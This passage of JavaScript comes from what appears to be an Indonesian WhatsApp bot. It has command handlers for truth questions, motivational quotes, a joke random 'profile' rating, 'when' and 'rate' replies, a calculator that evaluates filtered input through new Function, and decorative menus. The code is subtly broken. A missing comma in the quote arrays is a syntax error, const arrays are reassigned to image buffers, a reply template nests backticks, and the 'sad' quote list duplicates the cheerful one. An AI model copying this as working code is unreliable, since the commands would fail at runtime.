"Apa hal yang paling kau pertanyakan dalam hidupmu?",
"Siapa orang yang paling kau pengen jadi guru?",
"Apa hal yang paling kau jawab dalam hidupmu?",
"Kapan terakhir kali kau menjawab pertanyaan yang sulit?",
"Apa hal yang paling kau tanyakan dalam hidupmu?",
"Siapa orang yang paling kau pengen jadi murid?",
"Apa hal yang paling kau jawab dalam hidupmu?",
"Kapan terakhir kali kau bertanya sesuatu yang penting?",
"Apa hal yang paling kau lakukan dalam hidupmu?",
"Siapa orang yang paling kau pengen jadi rekan?",
"Apa hal yang paling kau kerjakan dalam hidupmu?",
"Kapan terakhir kali kau bekerja keras?",
"Apa hal yang paling kau mainkan dalam hidupmu?",
"Siapa orang yang paling kau pengen jadi lawan?",
"Apa hal yang paling kau menangkan dalam hidupmu?",
"Kapan terakhir kali kau menang dalam sesuatu?",
"Apa hal yang paling kau kalahkan dalam hidupmu?",
"Siapa orang yang paling kau pengen jadi teman?",
"Apa hal yang paling kau hilangkan dalam hidupmu?",
"Kapan terakhir kali kau kehilangan sesuatu yang berharga?",
"Apa hal yang paling kau temukan dalam hidupmu?",
"Siapa orang yang paling kau pengen jadi sahabat?",
"Apa hal yang paling kau cari dalam hidupmu?",
"Kapan terakhir kali kau menemukan sesuatu yang menarik?",
"Apa hal yang paling kau buat dalam hidupmu?",
"Siapa orang yang paling kau pengen jadi pembuat?",
"Apa hal yang paling kau rusak dalam hidupmu?",
"Kapan terakhir kali kau merusak sesuatu yang penting?",
"Apa hal yang paling kau perbaiki dalam hidupmu?",
"Siapa orang yang paling kau pengen jadi perbaik?",
"Apa hal yang paling kau hancurkan dalam hidupmu?",
"Kapan terakhir kali kau menghancurkan sesuatu yang berbahaya?",
"Apa hal yang paling kau bangun dalam hidupmu?",
"Siapa orang yang paling kau pengen jadi pembangun?",
"Apa hal yang paling kau gunakan dalam hidupmu?",
"Kapan terakhir kali kau menggunakan sesuatu yang berguna?",
"Apa hal yang paling kau buang dalam hidupmu?",
"Siapa orang yang paling kau pengen jadi pembuang?",
"Apa hal yang paling kau simpan dalam hidupmu?",
"Kapan terakhir kali kau menyimpan sesuatu yang rahasia?",
"Apa hal yang paling kau pinjam dalam hidupmu?",
"Siapa orang yang paling kau pengen jadi peminjam?",
"Apa hal yang paling kau kembalikan dalam hidupmu?",
"Kapan terakhir kali kau mengembalikan sesuatu yang dipinjam?",
"Apa hal yang paling kau beli dalam hidupmu?",
"Siapa orang yang paling kau pengen jadi pembeli?",
"Apa hal yang paling kau jual dalam hidupmu?",
"Kapan terakhir kali kau menjual sesuatu yang mahal?",
"Apa hal yang paling kau tukar dalam hidupmu?",
"Siapa orang yang paling kau pengen jadi penjual?",
"Apa hal yang paling kau berikan dalam hidupmu?",
"Kapan terakhir kali kau memberikan sesuatu yang berarti?",
"Apa hal yang paling kau terima dalam hidupmu?",
"Siapa orang yang paling kau pengen jadi pemberi?"
]
const frenzytruth = truth[Math.floor(Math.random() * truth.length)]
Truth = fs.readFileSync('./MwM/Frenzy.jpg')
FrenZyra.sendMessage(from, {
image: Truth, 
caption: `*${frenzytruth}*` },
{ quoted: m })
}
break
case "motivasi":
case "motivation": {
const Motivasi =[
"Kesuksesan dimulai dari keberanianmu",
"Setiap hari adalah kesempatan baru",
"Tantangan adalah batu loncatan menuju kesuksesan",
"Berpikir positif adalah kunci kesuksesanmu",
"Impianmu tidak akan pernah kalah jika kamu berjuang",
"Setiap kegagalan adalah pelajaran berharga",
"Raihlah bintang-bintang, lalu buatlah galaksi"
"Jangan takut untuk memulai yang baru",
"Pilihlah kebahagiaan setiap saat",
"Jadilah yang terbaik, bukan yang sempurna",
"Semangatmu adalah api di dalam dirimu",
"Bekerjalah dengan tekun, hasilnya tak akan menyia-nyiakanmu",
"Tak ada batasan bagi impianmu",
"Hidupmu adalah cerita yang belum selesai",
"Jika kamu bisa memimpikannya, kamu bisa meraihkannya",
"Kamu adalah penentu takdir hidupmu",
"Semua impian dimulai dengan satu langkah kecil",
"Teruslah bergerak maju, bahkan ketika terasa sulit",
"Kepercayaan diri adalah senjata terbesarmu",
"Kegigihanmu adalah kunci dalam meraih keberhasilan",
"Raih kesuksesanmu, lalu bantu orang lain untuk meraihnya",
"Jangan takut gagal, percayalah pada prosesnya",
"Tujuanmu adalah alasan kamu untuk bangkit setiap pagi",
"Tetaplah fokus pada tujuanmu, meski banyak godaan datang",
"Setiap hari adalah kesempatan untuk menjadi yang lebih baik",
"Mimpi adalah tiang yang menghubungkan langit dan bumi",
"Rauplah keberhasilanmu, tak ada yang bisa menghalangimu",
"Keberanianmu adalah sumber kekuatan tak terbatas",
"Keberhasilan adalah imbalan bagi mereka yang tak pernah menyerah",
"Tak ada tempat untuk penyesalan dalam perjalananmu menuju sukses",
"Kegagalan adalah teman sejati dalam perjalanan kesuksesan",
"Kehidupan adalah perjalanan, nikmati setiap langkahnya",
"Jadilah orang yang menginspirasi, bukan hanya mengikuti jejak orang lain",
"Kuatlah, hatimu adalah pahlawan sejati dalam dirimu",
"Setiap detik berharga dalam perjalanan hidupmu",
"Tak ada batasan bagi apa yang bisa kamu capai",
"Berani menghadapi tantangan, karena hidupmu layak mendapat yang terbaik",
"Jangan khawatir tentang kesalahanmu, bergeraklah maju dengan pelajaran yang didapat",
"Tak ada kata terlambat, mulailah sekarang juga",
"Kejarlah impianmu, meski langit pun menentang",
"Raihlah puncak yang paling tinggi, karena kamu itu hebat",
"Jangan pernah mengeluh, bersyukurlah atas apa yang sudah kamu miliki",
"Andalkan dirimu sendiri, kamu lebih kuat daripada yang kamu kira",
"Tak ada rahasia kesuksesan, kecuali kerja keras dan dedikasi",
"Jangan pernah menyerah, karena kamu belum mencoba semuanya",
"Indahkanlah setiap langkahmu dengan cinta dan semangat",
"Kamu adalah perancang takdirmu sendiri",
"Mungkin banyak yang meragukanmu, tetapi jadikan itu sebagai bahan bakarmu",
"Jika kamu ingin merubah dunia, mulailah dengan merubah dirimu sendiri",
"Ingatlah, kegagalan hanya salah satu bagian dari perjalananmu menuju sukses",
"Selalu berikan yang terbaik, bahkan ketika tak ada yang memperhatikan",
"Ketika kamu merasa putus asa, itu adalah saat kamu mendekati tujuanmu",
"Berpikirlah besar, jangan biarkan dunia menyusutkan impianmu",
"Kegigihan tanpa batas adalah kunci menuju pencapaian tertinggi",
"Bukalah pintu kesuksesan dengan kunci kerja keras dan ketekunanmu",
"Kamu mampu melakukan lebih dari yang kau kira, percayalah pada dirimu sendiri",
"Tak ada yang bisa menghentikanmu, kecuali jika kamu membiarkannya",
"Jadilah versi terbaik dari dirimu sendiri",
"Jangan biarkan kesalahan masa lalu menghantui masa depanmu",
"Rintangan adalah ujian bagimu, tunjukkan bahwa kamu bisa melewatinya",
"Setiap langkah adalah bagian penting dari perjalananmu menuju sukses",
"Keberhasilan adalah hasil dari kegigihan yang tak berujung",
"Kamu memiliki kekuatan untuk mengubah duniamu sendiri",
"Semangatmu adalah obat mujarab untuk meraih segalanya",
"Berpikirlah positif, dan hidupmu akan bercahaya",
"Jadilah berani, jangan pernah takut untuk gagal",
"Keberhasilan adalah tujuanmu, jangan berhenti sebelum mencapainya",
"Jangan menyerah, dunia sedang menanti untuk melihatmu berjaya",
"Raih impianmu sekarang, jangan menunggu waktu yang tepat",
"Jadilah cermin bagi orang lain, sehingga kamu bisa menginspirasi mereka",
"Bermimpi adalah langkah pertama dalam mewujudkannya",
"Tak ada kata terlambat untuk memulai apa yang benar",
"Jadilah yodium di dalam samudra yang luas",
"Teruslah berjalan, bahkan ketika langit punya rencana lain untukmu",
"Perjuanganmu adalah tonggak keberhasilanmu",
"Percayalah pada dirimu sendiri, karena kamu memiliki potensi yang luar biasa",
"Jangan pernah menyerah, karena setiap hari adalah kesempatan baru",
"Kuatlah, kamu bisa mengatasi segala rintangan yang datang",
"Impian itu nyata jika kamu memilih untuk menjalaninya",
"Jadi inspirasi bagi dirimu sendiri dan yang lain",
"Kesuksesan adalah hasil dari keberanianmu untuk mencobanya",
"Tak ada yang bisa menghentikanmu kecuali dirimu sendiri",
"Berpikir positif adalah kunci untuk mengubah hidupmu",
"Setiap jatuh adalah pelajaran untukmu agar lebih kuat bangkit",
"Tuhan memberimu impian karena Ia tahu kamu mampu mencapainya",
"Jangan pernah menyerah pada impianmu, karena dunia butuh apa yang kamu miliki",
"Keberhasilan adalah hasil dari konsistensimu dalam melakukan yang terbaik",
"Percaya pada dirimu sendiri adalah langkah pertama menuju kesuksesan",
"Keberanian adalah kualitas yang paling penting dalam mencapai impianmu",
"Kamu bisa, asalkan kamu berpikir bahwa kamu bisa",
"Hidup adalah perjalanan yang harus kamu manfaatkan sebaik-baiknya",
"Jika kamu ingin merubah dunia, mulailah dari merubah dirimu sendiri",
"Jadilah yang terbaik bukan untuk membuktikan pada orang lain, tapi untuk dirimu sendiri",
"Sukses adalah hasil dari keyakinanmu bahwa kamu bisa",
"Terima tantangan, dan buktikan bahwa kamu bisa mengatasinya",
"Tidak ada yang mustahil jika kamu mempercayainya",
"Keberhasilan tidak datang dengan cepat, tetapi selalu ada bagi yang tidak pernah menyerah",
"Rilis diri dari semua batasan dan mulai meraih apa yang kamu impikan",
"Kegigihanmu adalah senjata ampuh dalam menghadapi semua rintangan",
"Ingatlah, setiap hari adalah kesempatan yang langka, jangan sia-siakan kesempatanmu untuk meraih sukses"
]
const frenzymotivasi = Motivasi[Math.floor(Math.random() * Motivasi.length)]
Motivasi = fs.readFileSync('./MwM/Frenzy.jpg')
FrenZyra.sendMessage(from, {
image: Motivasi, 
caption: `*${frenzymotivasi}*` },
{ quoted: m })
}
break
case "motivasisad":
case "motivationsad": {
const Motivasisad =[
"Kesuksesan dimulai dari keberanianmu",
"Setiap hari adalah kesempatan baru",
"Tantangan adalah batu loncatan menuju kesuksesan",
"Berpikir positif adalah kunci kesuksesanmu",
"Impianmu tidak akan pernah kalah jika kamu berjuang",
"Setiap kegagalan adalah pelajaran berharga",
"Raihlah bintang-bintang, lalu buatlah galaksi"
"Jangan takut untuk memulai yang baru",
"Pilihlah kebahagiaan setiap saat",
"Jadilah yang terbaik, bukan yang sempurna",
"Semangatmu adalah api di dalam dirimu",
"Bekerjalah dengan tekun, hasilnya tak akan menyia-nyiakanmu",
"Tak ada batasan bagi impianmu",
"Hidupmu adalah cerita yang belum selesai",
"Jika kamu bisa memimpikannya, kamu bisa meraihkannya",
"Kamu adalah penentu takdir hidupmu",
"Semua impian dimulai dengan satu langkah kecil",
"Teruslah bergerak maju, bahkan ketika terasa sulit",
"Kepercayaan diri adalah senjata terbesarmu",
"Kegigihanmu adalah kunci dalam meraih keberhasilan",
"Raih kesuksesanmu, lalu bantu orang lain untuk meraihnya",
"Jangan takut gagal, percayalah pada prosesnya",
"Tujuanmu adalah alasan kamu untuk bangkit setiap pagi",
"Tetaplah fokus pada tujuanmu, meski banyak godaan datang",
"Setiap hari adalah kesempatan untuk menjadi yang lebih baik",
"Mimpi adalah tiang yang menghubungkan langit dan bumi",
"Rauplah keberhasilanmu, tak ada yang bisa menghalangimu",
"Keberanianmu adalah sumber kekuatan tak terbatas",
"Keberhasilan adalah imbalan bagi mereka yang tak pernah menyerah",
"Tak ada tempat untuk penyesalan dalam perjalananmu menuju sukses",
"Kegagalan adalah teman sejati dalam perjalanan kesuksesan",
"Kehidupan adalah perjalanan, nikmati setiap langkahnya",
"Jadilah orang yang menginspirasi, bukan hanya mengikuti jejak orang lain",
"Kuatlah, hatimu adalah pahlawan sejati dalam dirimu",
"Setiap detik berharga dalam perjalanan hidupmu",
"Tak ada batasan bagi apa yang bisa kamu capai",
"Berani menghadapi tantangan, karena hidupmu layak mendapat yang terbaik",
"Jangan khawatir tentang kesalahanmu, bergeraklah maju dengan pelajaran yang didapat",
"Tak ada kata terlambat, mulailah sekarang juga",
"Kejarlah impianmu, meski langit pun menentang",
"Raihlah puncak yang paling tinggi, karena kamu itu hebat",
"Jangan pernah mengeluh, bersyukurlah atas apa yang sudah kamu miliki",
"Andalkan dirimu sendiri, kamu lebih kuat daripada yang kamu kira",
"Tak ada rahasia kesuksesan, kecuali kerja keras dan dedikasi",
"Jangan pernah menyerah, karena kamu belum mencoba semuanya",
"Indahkanlah setiap langkahmu dengan cinta dan semangat",
"Kamu adalah perancang takdirmu sendiri",
"Mungkin banyak yang meragukanmu, tetapi jadikan itu sebagai bahan bakarmu",
"Jika kamu ingin merubah dunia, mulailah dengan merubah dirimu sendiri",
"Ingatlah, kegagalan hanya salah satu bagian dari perjalananmu menuju sukses",
"Selalu berikan yang terbaik, bahkan ketika tak ada yang memperhatikan",
"Ketika kamu merasa putus asa, itu adalah saat kamu mendekati tujuanmu",
"Berpikirlah besar, jangan biarkan dunia menyusutkan impianmu",
"Kegigihan tanpa batas adalah kunci menuju pencapaian tertinggi",
"Bukalah pintu kesuksesan dengan kunci kerja keras dan ketekunanmu",
"Kamu mampu melakukan lebih dari yang kau kira, percayalah pada dirimu sendiri",
"Tak ada yang bisa menghentikanmu, kecuali jika kamu membiarkannya",
"Jadilah versi terbaik dari dirimu sendiri",
"Jangan biarkan kesalahan masa lalu menghantui masa depanmu",
"Rintangan adalah ujian bagimu, tunjukkan bahwa kamu bisa melewatinya",
"Setiap langkah adalah bagian penting dari perjalananmu menuju sukses",
"Keberhasilan adalah hasil dari kegigihan yang tak berujung",
"Kamu memiliki kekuatan untuk mengubah duniamu sendiri",
"Semangatmu adalah obat mujarab untuk meraih segalanya",
"Berpikirlah positif, dan hidupmu akan bercahaya",
"Jadilah berani, jangan pernah takut untuk gagal",
"Keberhasilan adalah tujuanmu, jangan berhenti sebelum mencapainya",
"Jangan menyerah, dunia sedang menanti untuk melihatmu berjaya",
"Raih impianmu sekarang, jangan menunggu waktu yang tepat",
"Jadilah cermin bagi orang lain, sehingga kamu bisa menginspirasi mereka",
"Bermimpi adalah langkah pertama dalam mewujudkannya",
"Tak ada kata terlambat untuk memulai apa yang benar",
"Jadilah yodium di dalam samudra yang luas",
"Teruslah berjalan, bahkan ketika langit punya rencana lain untukmu",
"Perjuanganmu adalah tonggak keberhasilanmu",
"Percayalah pada dirimu sendiri, karena kamu memiliki potensi yang luar biasa",
"Jangan pernah menyerah, karena setiap hari adalah kesempatan baru",
"Kuatlah, kamu bisa mengatasi segala rintangan yang datang",
"Impian itu nyata jika kamu memilih untuk menjalaninya",
"Jadi inspirasi bagi dirimu sendiri dan yang lain",
"Kesuksesan adalah hasil dari keberanianmu untuk mencobanya",
"Tak ada yang bisa menghentikanmu kecuali dirimu sendiri",
"Berpikir positif adalah kunci untuk mengubah hidupmu",
"Setiap jatuh adalah pelajaran untukmu agar lebih kuat bangkit",
"Tuhan memberimu impian karena Ia tahu kamu mampu mencapainya",
"Jangan pernah menyerah pada impianmu, karena dunia butuh apa yang kamu miliki",
"Keberhasilan adalah hasil dari konsistensimu dalam melakukan yang terbaik",
"Percaya pada dirimu sendiri adalah langkah pertama menuju kesuksesan",
"Keberanian adalah kualitas yang paling penting dalam mencapai impianmu",
"Kamu bisa, asalkan kamu berpikir bahwa kamu bisa",
"Hidup adalah perjalanan yang harus kamu manfaatkan sebaik-baiknya",
"Jika kamu ingin merubah dunia, mulailah dari merubah dirimu sendiri",
"Jadilah yang terbaik bukan untuk membuktikan pada orang lain, tapi untuk dirimu sendiri",
"Sukses adalah hasil dari keyakinanmu bahwa kamu bisa",
"Terima tantangan, dan buktikan bahwa kamu bisa mengatasinya",
"Tidak ada yang mustahil jika kamu mempercayainya",
"Keberhasilan tidak datang dengan cepat, tetapi selalu ada bagi yang tidak pernah menyerah",
"Rilis diri dari semua batasan dan mulai meraih apa yang kamu impikan",
"Kegigihanmu adalah senjata ampuh dalam menghadapi semua rintangan",
"Ingatlah, setiap hari adalah kesempatan yang langka, jangan sia-siakan kesempatanmu untuk meraih sukses"
]
const frenzymotivasisad = Motivasisad[Math.floor(Math.random() * Motivasisad.length)]
Motivasisad = fs.readFileSync('./MwM/Frenzy.jpg')
FrenZyra.sendMessage(from, {
image: Motivasisad, 
caption: `*${frenzymotivasisad}*` },
{ quoted: m })
}
break
case "checkme":
case "profil":
case "profile":
case "myprofile":
case "cekme": {
neme = args.join(" ")
ZY = `${sender}`
var sifat = [
'Bad',
'Lucky',
'Fine',
'Unfriendly',
'Chapri',
'Nibba/Nibbi',
'Annoying',
'Dilapidated',
'Angry Person',
'Polite',
'Burden',
'Great',
'Cringe',
'Liar'
]
var hoby = [
'Cooking',
'Dancing',
'Playing',
'Gaming',
'Painting',
'Helping Others',
'Watching anime',
'Reading',
'Riding Bike',
'Singing',
'Chatting',
'Sharing Memes',
'Drawing',
'Eating Parents Money',
'Playing Truth or Dare',
'Staying Alone',
'Coding',
'Writing',
'Swimming'
]
var cakep = [
'Yes',
'No',
'Very Ugly',
'Very Handsome'
]
var wetak = [
'Caring',
'Generous',
'Angry person',
'Sorry',
'Submissive',
'Fine',
'Im sorry',
'Kind Hearted',
'Patient',
'UwU',
'Top',
'Helpful'
]
var dosa = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
var pahala = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
var bucin = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
var arp = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
var baik = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
var bad = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
var cerdas = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
var berani = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
var scary = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
var sipat = sifat[Math.floor(Math.random() * sifat.length)]
var amalp = pahala[Math.floor(Math.random() * pahala.length)]
var amald = dosa[Math.floor(Math.random() * dosa.length)]
var biho = hoby[Math.floor(Math.random() * hoby.length)]
var bhucin = bucin[Math.floor(Math.random() * bucin.length)]
var senga = arp[Math.floor(Math.random() * arp.length)]
var chakep = cakep[Math.floor(Math.random() * cakep.length)]
var watak = wetak[Math.floor(Math.random() * wetak.length)]
var baik = baik[Math.floor(Math.random() * baik.length)]
var burug = bad[Math.floor(Math.random() * bad.length)]
var cerdas = cerdas[Math.floor(Math.random() * cerdas.length)]
var berani = berani[Math.floor(Math.random() * berani.length)]
var takut = scary[Math.floor(Math.random() * scary.length)]
profile = `*≡══《 @${ZY.split('@')[0]} 》══≡*

*Name :* ${pushname}
*Characteristic :* ${sipat}
*Hobby :* ${biho}
*Simp :* ${bhucin}%
*Great :* ${senga}%
*Handsome :* ${chakep}
*Character :* ${watak}
*Good Morals :* ${baik}%
*Bad Morals :* ${burug}%
*Intelligence :* ${cerdas}%
*Courage :* ${berani}%
*Afraid :* ${takut}%
*Pahala :* ${amalp}%
*Dosa :* ${amald}%

*≡═══《 CHECK PROPERTIES 》═══≡*`
buff = fs.readFileSync('./MwM/Frenzy.jpg')
FrenZyra.sendMessage(from, { 
image: buff, 
caption: profile, 
mentions: [ZY]
},
{ quoted: m })
}
break
case "when": {
if (!text) return 
let Kapan = [
'5 More Days', 
'10 More Days', 
'15 More Days',
'20 More Days', 
'25 More Days',
'30 More Days',
'35 More Days',
'40 More Days',
'45 More Days',
'50 More Days',
'55 More Days',
'60 More Days',
'65 More Days',
'70 More Days',
'75 More Days',
'80 More Days',
'85 More Days',
'90 More Days',
'100 More Days',
'5 Months More',
'10 Months More', 
'15 Months More',
'20 Months More',
'25 Months More',
'30 Months More',
'35 Months More',
'40 Months More',
'45 Months More',
'50 Months More',
'55 Months More',
'60 Months More',
'65 Months More',
'70 Months More',
'75 Months More',
'80 Months More',
'85 Months More',
'90 Months More',
'100 Months More',
'1 More Years',
'2 More Years',
'3 More Years',
'4 More Years',
'5 More Years',
'Tomorrow',
'The Day After Tomorrow'
]
let TwT = Kapan[Math.floor(Math.random() * Kapan.length)]
let Answer = `*${TwT}*`
await reply(Answer)
}
break
case 'rate': {
if (!text) return 
let RT = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
let XO = RT[Math.floor(Math.random() * RT.length)]
let Answer = `*${XO}%*`
await reply(Answer)
}
break
case "kalkulator": {
if (!text) return reply(`Lah Mana`)
let val = text
.replace(/[^0-9\-\/+*×÷πEe()piPI/]/g, '')
.replace(/×/g, '*')
.replace(/÷/g, '/')
.replace(/π|pi/gi, 'Math.PI')
.replace(/e/gi, 'Math.E')
.replace(/\/+/g, '/')
.replace(/\++/g, '+')
.replace(/-+/g, '-')
let format = val
.replace(/Math\.PI/g, 'π')
.replace(/Math\.E/g, 'e')
.replace(/\//g, '÷')
.replace(/\*×/g, '×')
try {
console.log(val)
let result = (new Function('return ' + val))()
if (!result) throw result
reply(`*${format}* ```=``` _*${result}*_`)
} catch (e) {
if (e == undefined) throw 'Isinya?'
throw 'Format salah, hanya 0-9 dan Simbol -, +, *, /, ×, ÷, π, e, (, ) yang disupport'
}
}
break
case "open":
case "menu":
case "dashboard": {
await Loading()
Zyy = `${sender}`
const reactionMessage = {
react: {
text: "👾", 
key: m.key
}
}
await FrenZyra.sendMessage(sender, reactionMessage)
let logo = `${pickRandom(['⎔', '✦', '⭑', 'ᯬ', '⭔', '◉', '⬟', '▢', '᭻', '»', '〆', '々', '⛥', '✗', '⛊', '⚜', '⚝', '⚚', '♪', 'ぎ', '♡︎', '☠︎︎', '༒︎', '★', '۞', '✪', '⚠︎', '𖠌', 'ꕥ', '⌨︎', '♧︎︎︎', '☕︎', '☂︎', '𖤍', '✍︎', '豈', '☯︎', 'ᴥ︎︎︎', '♲︎︎︎', '߷', '⍟', '❦︎', 'ꨄ︎', '☀︎︎', 'シ︎', '㋛︎', '✿︎', '⌫', '𓂀', 'ϟ', '⫹⫺', '❒', '⽳⁩', 'ꪶ𖣂ꫂ', '∞', '🅥 ', '☪'])}`
let emot = `${pickRandom(['⎔', '✦', '⭑', 'ᯬ', '⭔', '◉', '⬟', '▢', '᭻', '»', '〆', '々', '⛥', '✗', '⛊', '⚜', '⚝', '⚚', '♪', 'ぎ', '♡︎', '☠︎︎', '༒︎', '★', '۞', '✪', '⚠︎', '𖠌', 'ꕥ', '⌨︎', '♧︎︎︎', '☕︎', '☂︎', '𖤍', '✍︎', '豈', '☯︎', 'ᴥ︎︎︎', '♲︎︎︎', '߷', '⍟', '❦︎', 'ꨄ︎', '☀︎︎', 'シ︎', '㋛︎', '✿︎', '⌫', '𓂀', 'ϟ', '⫹⫺', '❒', '⽳⁩', 'ꪶ𖣂ꫂ', '∞', '🅥 ', '⿻', '☪'])}`
let feel = `${pickRandom(['☹︎', '☺︎︎'])}`
frenzzz = `${Frenzy}@s.whatsapp.net`
Menu = `✧────···[ *𝙵𝚁𝙴𝙽𝚉𝚈𝚁𝙰-𝙼𝙳* ]···────✧

╔┓┏╦━━╦┓╔┓╔━━╗╔╗
║┗┛║┗━╣┃║┃║╯╰║║║
║┏┓║┏━╣┗╣┗╣╰╯║╠╣
╚┛┗╩━━╩━╩━╩━━╝╚╝

┌┈┈┈┈┈┈┈┈┈┈┈⌨︎
│@${sender.split("@")[0]} ꪶ𖣂ꫂ
└┬❖
┌┤☏︎ @${frenzzz.split("@")[0]}
│𝙳𝙰𝚂𝙷𝙱𝙾𝙰𝚁𝙳 𝙼𝙴𝙽𝚄 ⫹ Ϟ ⫺
└┬──────────☾ *︎${feel}* ☽︎
┌┤
╎
╎${logo} ${prefix}𝒍𝒊𝒔𝒕𝒎𝒆𝒏𝒖
╎${logo} ${prefix}𝒈𝒂𝒎𝒆𝒔𝒎𝒆𝒏𝒖
╎${logo} ${prefix}𝒊𝒏𝒇𝒐𝒃𝒐𝒕𝒎𝒆𝒏𝒖
╎${logo} ${prefix}𝒓𝒂𝒏𝒅𝒐𝒎𝒎𝒆𝒏𝒖
╎${logo} ${prefix}𝒔𝒖𝒃𝒔𝒄𝒓𝒊𝒃𝒆𝒓𝒔𝒎𝒆𝒏𝒖
╎${logo} ${prefix}𝒐𝒘𝒏𝒆𝒓
╎${logo} ${prefix}𝒄𝒉𝒂𝒏𝒈𝒆𝒍𝒐𝒈
╎
╚┈┈┈┈┈┈┈┈┈┈┈⌫`
var MP3 = fs.readFileSync(`${pickRandom([
'./TwT/IuI.mp3',
'./TwT/HvH.mp3',
'./TwT/YzY.mp3',
'./TwT/HoH.mp3',
'./TwT/VuV.mp3',
'./TwT/OuO.mp3'])}`)
Fren = fs.readFileSync('./MwM/Frenzy.jpg')
FrenZyra.sendMessage(from, {
image: Fren,
caption: Menu, 
mentions: [Zyy]
},
{ quoted: m })
FrenZyra.sendMessage(m.chat,
{audio: MP3,
mimetype: 'audio/mpeg',
ptt:true}, 
{ quoted: m })
}
break
case "listmenu":
case "menulist": {
await Loading()
Zyy = `${sender}`
const reactionMessage = {
react: {
text: "👾", 
key: m.key
}
}
await FrenZyra.sendMessage(sender, reactionMessage)
let logo = `${pickRandom(['⎔', '✦', '⭑', 'ᯬ', '⭔', '◉', '⬟', '▢', '᭻', '»', '〆', '々', '⛥', '✗', '⛊', '⚜', '⚝', '⚚', '♪', 'ぎ', '♡︎', '☠︎︎', '༒︎', '★', '۞', '✪', '⚠︎', '𖠌', 'ꕥ', '⌨︎', '♧︎︎︎', '☕︎', '☂︎', '𖤍', '✍︎', '豈', '☯︎', 'ᴥ︎︎︎', '♲︎︎︎', '߷', '⍟', '❦︎', 'ꨄ︎', '☀︎︎', 'シ︎', '㋛︎', '✿︎', '⌫', '𓂀', 'ϟ', '⫹⫺', '❒', '⽳⁩', 'ꪶ𖣂ꫂ', '∞', '🅥 ', '☪'])}`
let emot = `${pickRandom(['⎔', '✦', '⭑', 'ᯬ', '⭔', '◉', '⬟', '▢', '᭻', '»', '〆', '々', '⛥', '✗', '⛊', '⚜', '⚝', '⚚', '♪', 'ぎ', '♡︎', '☠︎︎', '༒︎', '★', '۞', '✪', '⚠︎', '𖠌', 'ꕥ', '⌨︎', '♧︎︎︎', '☕︎', '☂︎', '𖤍', '✍︎', '豈', '☯︎', 'ᴥ︎︎︎', '♲︎︎︎', '߷', '⍟', '❦︎', 'ꨄ︎', '☀︎︎', 'シ︎', '㋛︎', '✿︎', '⌫', '𓂀', 'ϟ', '⫹⫺', '❒', '⽳⁩', 'ꪶ𖣂ꫂ', '∞', '🅥 ', '⿻', '☪'])}`
let feel = `${pickRandom(['☹︎', '☺︎︎'])}`
